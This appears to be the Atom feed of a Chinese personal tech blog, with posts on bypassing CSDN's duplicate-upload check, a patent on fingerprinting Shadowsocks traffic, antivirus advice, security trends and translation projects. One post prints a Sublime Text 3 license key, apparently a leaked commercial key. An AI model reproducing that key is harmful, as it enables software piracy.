<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>龙哥盟</title>
  
  <subtitle>英特纳雄耐尔，就一定要实现。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.flygon.net/"/>
  <updated>2018-10-29T08:27:03.144Z</updated>
  <id>http://www.flygon.net/</id>
  
  <author>
    <name>Flygon</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CSDN 重复文件上传限制的解决办法</title>
    <link href="http://www.flygon.net/CSDN-%E9%87%8D%E5%A4%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>http://www.flygon.net/CSDN-重复文件上传限制的解决办法/</id>
    <published>2017-12-09T14:39:40.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<p>CSDN 最近限制了重复文件。如果有人已经上传了某个文件，再次上传会失败：</p><p><img src="http://ww1.sinaimg.cn/large/841aea59gy1fmai6vf6idj20td07ggll.jpg" alt=""></p><p>有的时候打了压缩包还是没用，那么，可以试试添加个注释。</p><p>比如说，我这里有个压缩包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件: C:\Users\asus\Desktop\《SciPy and NumPy》中文精要.7z</span><br><span class="line">大小: 1353887 字节</span><br><span class="line">修改时间: 2017年12月9日, 14:30:01</span><br><span class="line">MD5: E8597649E8EBA0797237CF82C03A843C</span><br><span class="line">SHA1: 60CBCC9F43E56F1DE8EC0178066807850E415083</span><br><span class="line">CRC32: 2B058995</span><br></pre></td></tr></table></figure><p>给它加点注释，就用当前日期和时间好了，这个肯定没有人会和你重复。</p><p><img src="http://ww1.sinaimg.cn/large/841aea59gy1fmai762l09j20rm0h23zs.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件: C:\Users\asus\Desktop\《SciPy and NumPy》中文精要.7z</span><br><span class="line">大小: 1353904 字节</span><br><span class="line">修改时间: 2017年12月9日, 14:32:02</span><br><span class="line">MD5: ECCB7BF037BFCFDC435285B249F265FD</span><br><span class="line">SHA1: A1ECDA73375F5AFABD1AD0479195EB499D5B7270</span><br><span class="line">CRC32: F91C16EC</span><br></pre></td></tr></table></figure><p>校验值就完全变了，系统会把它看成不同的文件。</p><p>此外，这个方式也能躲过根据校验值的文件屏蔽。如果文件过大压缩过程较慢，可以设置为<code>Store</code>方式。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CSDN 最近限制了重复文件。如果有人已经上传了某个文件，再次上传会失败：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/841aea59gy1fmai6vf6idj20td07ggll.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;有
      
    
    </summary>
    
      <category term="应用" scheme="http://www.flygon.net/categories/%E5%BA%94%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>2018 规划</title>
    <link href="http://www.flygon.net/2018-%E8%A7%84%E5%88%92/"/>
    <id>http://www.flygon.net/2018-规划/</id>
    <published>2017-12-02T12:02:56.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>搞 Quant</p></li><li><p>打 Kaggle</p></li><li><p>翻译一些机器学习应用于其它领域的资料：机器量化、社会计算、法律计算、数字人文、生物信息、医疗大数据等。</p></li><li><p>看完<a href="https://www.52pojie.cn/thread-526618-1-1.html" target="_blank" rel="noopener">郁金香商业辅助教程</a>。</p></li><li><p>没了</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;搞 Quant&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;打 Kaggle&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;翻译一些机器学习应用于其它领域的资料：机器量化、社会计算、法律计算、数字人文、生物信息、医疗大数据等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;看完&lt;a hre
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>传说中的南邮 SS 嗅探算法</title>
    <link href="http://www.flygon.net/nanyou-ss-sniffing/"/>
    <id>http://www.flygon.net/nanyou-ss-sniffing/</id>
    <published>2017-10-08T14:11:37.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以后所有某墙相关的东西都在这个仓库里：</p></blockquote><blockquote><ul><li><a href="https://github.com/258ch/sniffing-research" target="_blank" rel="noopener">Github</a></li><li><a href="https://gitee.com/wizardforcel/sniffing-research" target="_blank" rel="noopener">Gitee</a></li></ul></blockquote><p>这就是传说中的南邮 SS 嗅探算法：</p><p><a href="https://www.google.com/patents/CN105281973A?cl=zh&amp;hl=zh-CN" target="_blank" rel="noopener">一种针对特定网站类别的网页指纹识别方法 CN 105281973 A（谷歌专利检索）</a></p><p>为了照顾没有梯子的同学，将其保存到内网一份：</p><p><a href="http://download.csdn.net/download/wizardforcel/10010817" target="_blank" rel="noopener">PDF 格式下载</a></p><p>目前没有 GFW 何时更新的消息，并且这个算法也不一定被使用，不过防患于未然总是好的。</p><p>我简单扫了一眼：</p><blockquote><p>[0047]在实际环境下应用该方法时，由于存在大量商业匿名通信工具和浏览器，本发明 选取shadowocks翻墙软件以及chrome浏览器进行说明。如图3所示，首先目标通过使用 shadowsocks翻墙工具访问浏览境外网站，shadowsocks工具连接到远端SOCKS代理服务 器，并使用chrome浏览器，此时shadowsocks工具在目标用户和远端代理服务器之间建立 了一个匿名加密通信信道，该信道通过某个监控者可控的交换设备，该交换设备被配置有 镜像端口，可由监控者抓取目标用户的流量数据，监控者通过从流量数据中提取出相应的 网页加载数据，并对其进行分析。其中，监控者与目标用户处于相同的通信链路环境，目标 所产生的流量数据可被监控方获取，流量数据载荷部分被加密。本发明基于该环境依据如 图1所示的方法流程进行工作，具体的分析步骤包括：</p></blockquote><blockquote><p>[0048] 步骤1:监控者通过利用可控交换设备使用数据采集工具进行数据收集，包括目 标数据收集和训练数据收集。目标数据收集主要是通过数据采集工具对目标浏览网站的流 量数据进行收集，并从流量中提取出网页加载流量。训练数据收集主要是监控者使用浏览 器访问目标可能会浏览的网站并在通信链路上收集并提取出相应网站的网页加载流量，其 中每个网站分别使用4种不同的浏览器操作方式对其进行访问，每种浏览器操作方式分别 收集10次指纹数据。指纹数据由数据采集工具导入至CSV文件中，在每个指纹数据记录了 一次网页加载过程中浏览器与远端Web服务器间所有的流量活动，这些指纹数据由一些系 列TCP数据包构成，由于加密技术的影响无法得到TCP数据包载荷部分的信息，其余TCP数 据包信息的数据结构包括：数据包序号、数据包传输时间、源IP地址、目的IP地址、数据包 大小以及数据包描述。</p></blockquote><blockquote><p>[0049] 步骤2:收集完指纹数据后，需要对其进行数据预处理操作。指纹数据中的TCP数 据中含有大量的协议控制数据，这些协议控制数据主要用于控制TCP数据的建立和断开， 除此之外原始的指纹数据中还包含有其它的冗余和噪音数据，包括：TCP重传数据包以及 TCP坏包。本案例将shadowsocks指纹数据中数据包大小小于70的数据包视为协议控制数 据包予以清除，并将数据包描述中含有”Retransmission”，”Dup”，”0ut-〇f-〇rder”描述字 段的数据包视为坏包和重传数据包予以清除。</p></blockquote><p>可以看到它简单将包长度作为特征进行提取，这个在特征工程中是相当不可靠的，可以用混淆轻易绕过。</p><p>进一步的发现，以及反制措施，我研究透彻之后就会发布。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;以后所有某墙相关的东西都在这个仓库里：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/258ch/sniffing-research&quot; target=&quot;_bl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sublime text 3 3143 license</title>
    <link href="http://www.flygon.net/sublime-text-3-3143-license/"/>
    <id>http://www.flygon.net/sublime-text-3-3143-license/</id>
    <published>2017-09-14T11:11:15.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">—– BEGIN LICENSE —–</span><br><span class="line">TwitterInc</span><br><span class="line">200 User License</span><br><span class="line">EA7E-890007</span><br><span class="line">1D77F72E 390CDD93 4DCBA022 FAF60790</span><br><span class="line">61AA12C0 A37081C5 D0316412 4584D136</span><br><span class="line">94D7F7D4 95BC8C1C 527DA828 560BB037</span><br><span class="line">D1EDDD8C AE7B379F 50C9D69D B35179EF</span><br><span class="line">2FE898C4 8E4277A8 555CE714 E1FB0E43</span><br><span class="line">D5D52613 C3D12E98 BC49967F 7652EED2</span><br><span class="line">9D2D2E61 67610860 6D338B72 5CF95C69</span><br><span class="line">E36B85CC 84991F19 7575D828 470A92AB</span><br><span class="line">—— END LICENSE ——</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>膜拜 @hhh0578 大神</title>
    <link href="http://www.flygon.net/%E8%86%9C%E6%8B%9C-hhh0578-%E5%A4%A7%E7%A5%9E/"/>
    <id>http://www.flygon.net/膜拜-hhh0578-大神/</id>
    <published>2017-04-01T21:33:55.000Z</published>
    <updated>2018-10-29T08:27:03.148Z</updated>
    
    <content type="html"><![CDATA[<p>你们看 RE0 小说的时候，注意到 3~9 卷都是一个人翻译的嘛？</p><p>第三卷：<a href="https://tieba.baidu.com/p/4216390431" target="_blank" rel="noopener">https://tieba.baidu.com/p/4216390431</a><br>第四卷：<a href="https://tieba.baidu.com/p/4225689196" target="_blank" rel="noopener">https://tieba.baidu.com/p/4225689196</a><br>第五卷：<a href="https://tieba.baidu.com/p/4309263284" target="_blank" rel="noopener">https://tieba.baidu.com/p/4309263284</a><br>第六卷：<a href="https://tieba.baidu.com/p/4380341503" target="_blank" rel="noopener">https://tieba.baidu.com/p/4380341503</a><br>第七卷：<a href="https://tieba.baidu.com/p/4439329155" target="_blank" rel="noopener">https://tieba.baidu.com/p/4439329155</a><br>第八卷：<a href="https://tieba.baidu.com/p/4506247213" target="_blank" rel="noopener">https://tieba.baidu.com/p/4506247213</a><br>第九卷：<a href="https://tieba.baidu.com/p/4881973371" target="_blank" rel="noopener">https://tieba.baidu.com/p/4881973371</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;你们看 RE0 小说的时候，注意到 3~9 卷都是一个人翻译的嘛？&lt;/p&gt;
&lt;p&gt;第三卷：&lt;a href=&quot;https://tieba.baidu.com/p/4216390431&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://tieba.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>关于国内厂商的国际版杀毒软件</title>
    <link href="http://www.flygon.net/%E5%9B%BD%E5%86%85%E5%8E%82%E5%95%86%E7%9A%84%E5%9B%BD%E9%99%85%E7%89%88%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/"/>
    <id>http://www.flygon.net/国内厂商的国际版杀毒软件/</id>
    <published>2017-03-30T16:00:31.000Z</published>
    <updated>2018-10-29T08:27:03.148Z</updated>
    
    <content type="html"><![CDATA[<p>很多国内软件公司的杀毒软件都分为国内版和国际版，这二者有什么区别呢？</p><p>首先，这两个的团队是不一样的。国际版的团队大多收购，国内版为自研。例如百度杀毒的国际版就是原超级巡警的团队做的，而国内版是自己另起炉灶。</p><p>其次，由于国外良好的用户环境和监管，国际版的软件体验良好，没有流氓或者窃取隐私的行为。</p><p>然而它们都是免费的。所以推荐大家使用这些国际版的杀软。不用国内版的软件，也算是为净化国内的互联网环境出了一份力。如果你之前拉黑了国内版的证书也没有关系，二者的证书是不一样的。</p><ul><li><a href="http://www.pcfaster.com/zhtw/" target="_blank" rel="noopener">Baidu PC Faster（百度安全卫士国际版）</a></li><li><a href="http://antivirus.baidu.com/zh/" target="_blank" rel="noopener">Baidu Antivirus（百度杀毒软件国际版）</a></li><li><a href="http://www.pcmgr-global.com/" target="_blank" rel="noopener">Tencent PC Manager（腾讯电脑管家国际版）</a></li><li><a href="https://www.360totalsecurity.com/zh-cn/features/360-total-security/" target="_blank" rel="noopener">360 Total Security（360 安全卫士国际版）</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;很多国内软件公司的杀毒软件都分为国内版和国际版，这二者有什么区别呢？&lt;/p&gt;
&lt;p&gt;首先，这两个的团队是不一样的。国际版的团队大多收购，国内版为自研。例如百度杀毒的国际版就是原超级巡警的团队做的，而国内版是自己另起炉灶。&lt;/p&gt;
&lt;p&gt;其次，由于国外良好的用户环境和监管，国
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>互联网安全观察</title>
    <link href="http://www.flygon.net/%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%A7%82%E5%AF%9F/"/>
    <id>http://www.flygon.net/互联网安全观察/</id>
    <published>2017-03-24T11:18:51.000Z</published>
    <updated>2018-10-29T08:27:03.148Z</updated>
    
    <content type="html"><![CDATA[<p>2012 年移动互联网浪潮开始，新出现的应用很少有 XSS 和 SQL 注入漏洞。越权和绕过漏洞明显增多，甚至占到主要比重。（大概是因为互联网公司加班和缺乏充分测试所致。）而更糟糕的是，后者没有可用的形式化防范和测试方法（SQL可以预编译，XSS可以使用开启引擎的默认转义），漏洞挖掘比起前者更加依赖经验。</p><p>对新兴事物重视不足，比如最新流行的 NoSQL，可能出现未授权访问、注入，以及竞态条件（Race Condition）等漏洞。（因为大家普遍认为新兴事物是“默认安全”的，并且对NoSQL 的隔离级别不了解而没有意识到使用事务。）在 Redis 未授权访问一周年之际，Mongo和Hadoop（？）也爆出了此类漏洞。近几年后端的演变向着服务化和容器化的方向进行，此类服务只会多不会少，而大部分服务都是没有“默认安全”的。</p><p>过多重视 PHP，导致过度重视 PHP 独有的漏洞，比如文件包含，以及文件上传（由于PHP 的默认不安全的路由机制导致）。现在 Web 应用基本都使用自定义的动态路由，很难执行路由之外的页面。</p><p>过度重视 Web 而忽视了二进制。XSS 需要结合 JS 引擎的攻击和溢出，否则你连计算器都弹不了，只能收集一下用户的 Cookie。服务器方面，最终的提权也需要内核漏洞的配合。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2012 年移动互联网浪潮开始，新出现的应用很少有 XSS 和 SQL 注入漏洞。越权和绕过漏洞明显增多，甚至占到主要比重。（大概是因为互联网公司加班和缺乏充分测试所致。）而更糟糕的是，后者没有可用的形式化防范和测试方法（SQL可以预编译，XSS可以使用开启引擎的默认转义）
      
    
    </summary>
    
      <category term="安全" scheme="http://www.flygon.net/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>做博客一定要以 D 哥为榜样</title>
    <link href="http://www.flygon.net/%E5%81%9A%E5%8D%9A%E5%AE%A2%E4%B8%80%E5%AE%9A%E8%A6%81%E4%BB%A5D%E5%93%A5%E4%B8%BA%E6%A6%9C%E6%A0%B7/"/>
    <id>http://www.flygon.net/做博客一定要以D哥为榜样/</id>
    <published>2017-03-17T15:34:56.000Z</published>
    <updated>2018-10-29T08:27:03.148Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://blog.csdn.net/dl88250" target="_blank" rel="noopener">http://blog.csdn.net/dl88250</a></p><p>D（88250），Hacpai 站长。</p><p>虽然他现在的博客迁到 b3 了，但是原来那个依然很壮观。</p><p><img src="http://upload-images.jianshu.io/upload_images/118142-5f445e95c888b695.jpg" alt=""></p><p>人世间最痛苦的事情就是</p><p>大神早在十年前超越了你</p><p>而你却希望过了三五年也能跟大神一样</p><p>我已经不知道说什么了</p><p>:joy::joy::joy:</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/dl88250&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://blog.csdn.net/dl88250&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;D（88250），Hacpai 站长。&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="杂记" scheme="http://www.flygon.net/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>浙江省 2017 高中信息技术改革</title>
    <link href="http://www.flygon.net/%E6%B5%99%E6%B1%9F%E7%9C%812017%E9%AB%98%E4%B8%AD%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E6%94%B9%E9%9D%A9/"/>
    <id>http://www.flygon.net/浙江省2017高中信息技术改革/</id>
    <published>2017-02-18T12:06:52.000Z</published>
    <updated>2018-10-29T08:27:03.148Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>相关讨论：<a href="https://www.zhihu.com/question/55811645" target="_blank" rel="noopener">如何评价即将开始使用的浙江省新高中信息技术教材，将围绕Python进行并增加编程相关知识点？</a></p></blockquote><p>浙江省信息技术新教材，即将在2017级（2017年9月入学）高中新生中开始使用。</p><p>新教材的改动如下：</p><ul><li><p>《信息技术基础》：excel/access =&gt; numpy/pandas/matplotlib</p></li><li><p>《多媒体技术应用》：取消</p></li><li><p>《算法与程序设计》：vb =&gt; python，并添加线性结构和树的知识点</p></li></ul><p>值得一提的是，考查形式还是笔试。想当年我读高中的时候，北京虽然还在使用 vb，但是考查形式是机试，浙江还是要学习一个。</p><p>matplotlib 这个东西，不仅仅可用于编程，对于学生学习数学也是有帮助的。</p><p>另外，各位大佬们，到时候组个团开培训班可好？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;相关讨论：&lt;a href=&quot;https://www.zhihu.com/question/55811645&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;如何评价即将开始使用的浙江省新高中信息技术教材，将围绕Python进行并增加
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>生物劝退文集整理</title>
    <link href="http://www.flygon.net/bio-discouragement/"/>
    <id>http://www.flygon.net/bio-discouragement/</id>
    <published>2017-02-13T21:38:30.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<p>应某位师妹的要求，整理了这份文集。我觉得我必须为这个世界做一些微小的贡献。</p><p>文集托管在 GitBook 上，大家可以提 Issue，提供一些不错的劝退文章，我会不定期更新。</p><blockquote><p>劝退一人胜发 7 篇 SCI。</p></blockquote><ul><li><a href="https://www.gitbook.com/book/wizardforcel/bio-discouragement/details" target="_blank" rel="noopener">在线阅读</a></li><li><a href="https://www.gitbook.com/download/pdf/book/wizardforcel/bio-discouragement" target="_blank" rel="noopener">PDF格式</a></li><li><a href="https://www.gitbook.com/download/epub/book/wizardforcel/bio-discouragement" target="_blank" rel="noopener">EPUB格式</a></li><li><a href="https://www.gitbook.com/download/mobi/book/wizardforcel/bio-discouragement" target="_blank" rel="noopener">MOBI格式</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;应某位师妹的要求，整理了这份文集。我觉得我必须为这个世界做一些微小的贡献。&lt;/p&gt;
&lt;p&gt;文集托管在 GitBook 上，大家可以提 Issue，提供一些不错的劝退文章，我会不定期更新。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;劝退一人胜发 7 篇 SCI。&lt;/p&gt;
&lt;/b
      
    
    </summary>
    
    
      <category term="生物劝退" scheme="http://www.flygon.net/tags/%E7%94%9F%E7%89%A9%E5%8A%9D%E9%80%80/"/>
    
  </entry>
  
  <entry>
    <title>2017 规划</title>
    <link href="http://www.flygon.net/2017-%E8%A7%84%E5%88%92/"/>
    <id>http://www.flygon.net/2017-规划/</id>
    <published>2016-12-28T21:09:00.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>认识 100 个妹子。</p><p>之前经过试验，平均投 10 次简历就能得到一个 offer，对于程序员来说，想要脱单的话，我掐指一算，差不多就是这个数值<code>x10</code>，所以是 100 个。</p></li><li><p>安全方面：</p><ul><li><p>翻译完成《Web Hacking 101》</p></li><li><p>看完看雪的绿书</p></li><li><p>出一套安卓逆向的教程</p></li></ul><blockquote><p>老夫玩逆向就是一把梭，OD、IDA，拿起键盘就是干！</p></blockquote></li><li><p>利用空闲时间编写几个自绘控件。</p></li><li><p>弹琴。</p></li><li><p>英语</p><ul><li><p>上 Quora 阅读和编写答案。</p></li><li><p>练习听力，争取不带字幕听懂美剧。</p></li></ul></li></ol><p>我知道以上这些规划很可能不会在一年之内完成，如果是这样那就明年继续。大家猜一猜我能完成几个呢？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;认识 100 个妹子。&lt;/p&gt;
&lt;p&gt;之前经过试验，平均投 10 次简历就能得到一个 offer，对于程序员来说，想要脱单的话，我掐指一算，差不多就是这个数值&lt;code&gt;x10&lt;/code&gt;，所以是 100 个。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;安全方面
      
    
    </summary>
    
      <category term="杂记" scheme="http://www.flygon.net/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>SICP Python 描述 翻译完成</title>
    <link href="http://www.flygon.net/sicp-python/"/>
    <id>http://www.flygon.net/sicp-python/</id>
    <published>2016-09-12T17:19:03.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/wizardforcel/sicp-py-zh" target="_blank" rel="noopener">https://github.com/wizardforcel/sicp-py-zh</a></p><p>很惭愧，就做了一点微小的工作，谢谢大家！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/wizardforcel/sicp-py-zh&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/wizardforcel/sicp-py-zh&lt;/a&gt;&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="编程" scheme="http://www.flygon.net/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>历史的车轮滚滚向前</title>
    <link href="http://www.flygon.net/%E5%8E%86%E5%8F%B2%E7%9A%84%E8%BD%A6%E8%BD%AE%E6%BB%9A%E6%BB%9A%E5%90%91%E5%89%8D/"/>
    <id>http://www.flygon.net/历史的车轮滚滚向前/</id>
    <published>2016-07-09T16:06:30.000Z</published>
    <updated>2018-10-29T08:27:03.148Z</updated>
    
    <content type="html"><![CDATA[<p>2010年7月9日，一位神秘人士报料称，绿坝·花季护航软件项目组位于北京华杰大厦的项目办公室已经关张，所有员工都被遣散。从工业信息化部5月19日发布通知，强硬要求所有电脑厂商7月1日后都必须安装上网过滤软件”绿坝”，到6月30日宣布推迟预装仅隔了41天。但这短短的41天却引发了一场全国性的反对浪潮，甚至引发了海外组织的强力干预，最终以一场闹剧终结，成为又一个朝令夕改的典范。</p><p>同样是2010年，广电总局也曾向央视等媒体下达通知，要求在主持人口播、记者采访和字幕中，不能再使用诸如NBA、GDP、WTO、CPI等外语和缩略词。然而除了最开始引起的一片悲叹之外，这一通知从来就没有真正实行过。中央电视台左上角挂着的“CCTV”字样更是对其巨大的讽刺。</p><p>2014年底，独立导演范坡坡发现自己的纪录片《彩虹伴我心》被广电总局下架，随后一年，范坡坡走向维权之路，向北京市第一中级人民法院对广电总局提起诉讼，2015年11月3日，广电总局被判违法。</p><p>2016年3月，工信部起草了《互联网域名管理办法（修订征求意见稿）》，意图屏蔽所有境外域名，将天朝隔绝于互联网世界。各路IT人士纷纷投票或写邮件来表达意见，最后迫使工信部做出调整，并做出合理解释。</p><p>近日，广电总局出台了手游的新规定，要求手游必须“提前审批”，并且限制其中的外文词汇。游戏开发者“<a href="http://www.cnblogs.com/krisirk/p/5643138.html" target="_blank" rel="noopener">巨斧陈宇</a>”发起众筹准备起诉广电总局。在仅仅11小时内，就完成了5万的目标。</p><p>广电总局及其它部门在语言文化的认知上面，仍然处于旧时代的水平，这非常令人遗憾。但是，即使身处在黑暗中，我们也不应忘记追求光明。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2010年7月9日，一位神秘人士报料称，绿坝·花季护航软件项目组位于北京华杰大厦的项目办公室已经关张，所有员工都被遣散。从工业信息化部5月19日发布通知，强硬要求所有电脑厂商7月1日后都必须安装上网过滤软件”绿坝”，到6月30日宣布推迟预装仅隔了41天。但这短短的41天却引
      
    
    </summary>
    
      <category term="杂记" scheme="http://www.flygon.net/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>笨办法学C 翻译完成</title>
    <link href="http://www.flygon.net/lcthw-zh-complete/"/>
    <id>http://www.flygon.net/lcthw-zh-complete/</id>
    <published>2016-06-23T16:58:11.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<p>我看见2012年就有人说要开坑翻译这本书，当时这本书还只写了一半，那个译者也没坚持翻译完，甚至连已经翻译的部分都找不到了。于是我自己从头开始弄，三个月翻译完了。</p><p>作者的行文风格比较朴素和直白，但正是没有使用各种专业术语，使得它废话比较多也比较绕，各种代词更是不明所以。我在翻译过来之后也没有做整体的润色，但会尽量忠实于作者的意图，并用更清晰的表述转述出来。</p><p>此外，作者的“笨办法学JS”已经开始筹备，具体完成时间未知，应该需要等个几年。</p><p>链接：<a href="https://github.com/wizardforcel/lcthw-zh" target="_blank" rel="noopener">https://github.com/wizardforcel/lcthw-zh</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我看见2012年就有人说要开坑翻译这本书，当时这本书还只写了一半，那个译者也没坚持翻译完，甚至连已经翻译的部分都找不到了。于是我自己从头开始弄，三个月翻译完了。&lt;/p&gt;
&lt;p&gt;作者的行文风格比较朴素和直白，但正是没有使用各种专业术语，使得它废话比较多也比较绕，各种代词更是不
      
    
    </summary>
    
    
      <category term="编程" scheme="http://www.flygon.net/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Hello, ES6!</title>
    <link href="http://www.flygon.net/hello-es6/"/>
    <id>http://www.flygon.net/hello-es6/</id>
    <published>2016-06-15T18:44:56.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hello = <span class="function"><span class="params">s</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Hello, <span class="subst">$&#123;s&#125;</span>!`</span>);</span><br><span class="line">hello(<span class="string">'ES6'</span>);</span><br><span class="line"><span class="comment">// Hello, ES6!</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l
      
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>已投反对，请各位放心</title>
    <link href="http://www.flygon.net/vote-against-37/"/>
    <id>http://www.flygon.net/vote-against-37/</id>
    <published>2016-03-31T15:17:37.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/large/841aea59jw1f2g2id31ymj20vf0hzmzg.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/841aea59jw1f2g2id31ymj20vf0hzmzg.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="网站" scheme="http://www.flygon.net/tags/%E7%BD%91%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>本站即日起拒绝XP及之前的Windows系统，和IE8及之前的IE浏览器的访问。</title>
    <link href="http://www.flygon.net/kill-xp-and-ie8/"/>
    <id>http://www.flygon.net/kill-xp-and-ie8/</id>
    <published>2016-02-13T18:33:37.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<p>以上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以上。&lt;/p&gt;

      
    
    </summary>
    
